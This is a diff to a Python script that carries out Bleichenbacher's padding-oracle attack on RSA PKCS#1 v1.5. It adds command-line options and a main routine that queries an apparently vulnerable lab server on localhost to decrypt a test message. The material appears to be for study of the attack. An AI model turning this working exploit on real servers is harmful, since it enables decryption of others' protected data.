@@ -1,13 +1,43 @@
-from Crypto.Util.number import long_to_bytes, bytes_to_long
+from Crypto.Util.number import long_to_bytes
 from attack.oracle import oracle, init_oracle, ServerClosed
 from attack.disjoint_segments import DisjointSegments
+from attack.create_attack_config import get_cipher, get_public
 from random import randint
-from icecream import ic
 from socket import SHUT_RDWR
+import argparse
 
 
 def ceil_div(x: int, y: int) -> int:
     return (x + y - 1) // y
+
+
+def attack_arguments_parser() -> argparse.Namespace:
+    """
+    Parses command-line arguments for configuring the Bleichenbacher attack.
+
+    Returns:
+        argparse.Namespace: A namespace object containing the parsed arguments.
+    """
+    parser = argparse.ArgumentParser(
+        description="Starts a Bleichenbacher attack on a vulnerable server",
+        epilog="Try running and see if the attack will decrypt the message in time",
+    )
+    parser.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        help="prints state of deciphering while running",
+    )
+    parser.add_argument(
+        "-r",
+        "--random",
+        action="store_true",
+        help="add this flag if you want the blinding to be random",
+    )
+    parser.add_argument("-p", "--port", help="sets the server's port, defaults to 8001")
+    parser.add_argument("--host", help="sets the server's host, defaults to localhost")
+    my_args = parser.parse_args()
+    return my_args
 
 
 class Attacker:
@@ -20,7 +50,7 @@ class Attacker:
         host: str,
         port: int,
         random_blinding: bool = False,
-        iteration: int = 1,
+        verbose: bool = True,
     ) -> None:
         self.N = N
         self.E = E
@@ -38,7 +68,8 @@ class Attacker:
         self.M: DisjointSegments = DisjointSegments(
             [range(2 * self.B, 3 * self.B)]
         )  # ! dangerous
-        self.iteration = iteration
+        self.iteration = 1
+        self.verbose = verbose
 
     def oracle(self, num: int) -> bool:
         return oracle(num, self.conn)
@@ -65,8 +96,8 @@ class Attacker:
             ctr += 1
             if self.s_oracle(s):
                 return s
-            if ctr % 10_000 == 0:
-                ic(ctr)
+            if ctr % 10_000 == 0 and self.verbose:
+                print(f"sent {ctr} queries")
 
         raise ValueError("no next conforming")
 
@@ -151,8 +182,9 @@ class Attacker:
             # step 3
             self.update_intervals(self.s_list[-1])
             if self.iteration <= 5 or self.iteration % 50 == 0:
-                ic(self.iteration)
-                ic(self.M.size())
+                print(f"in iteration number: {self.iteration}")
+                if self.verbose:
+                    print(f"possible messages: {self.M.size()}")
 
             # step 4
             if len(self.M) == 1:
@@ -166,9 +198,9 @@ class Attacker:
             return True, self.M.smallest_inclusive()  # ran out of time
 
     def attack(self) -> tuple[range, int]:
-        ic("started attack")
+        print("started attack")
         self.blinding()
-        ic("did blinding")
+        print("did blinding")
         while True:
             res, ans = self.algo_iteration()
             if res:
@@ -177,3 +209,31 @@ class Attacker:
                 self.conn.close()
                 return ans, self.s0
             self.iteration += 1
+
+
+if __name__ == "__main__":
+    my_args = attack_arguments_parser()
+
+    port: int = 8001
+    if my_args.port and my_args.port.isdecimal():
+        port = int(my_args.port)
+
+    host = "localhost"
+    if my_args.host:
+        host = my_args.host
+
+    N, E = get_public()
+    C = get_cipher("hello world")
+    attacker = Attacker(
+        N,
+        E,
+        C,
+        host,
+        port,
+        my_args.random,
+        my_args.verbose,
+    )
+
+    res_range, s0 = attacker.attack()
+    res = res_range.start
+    print(long_to_bytes(res * pow(s0, -1, N) % N))
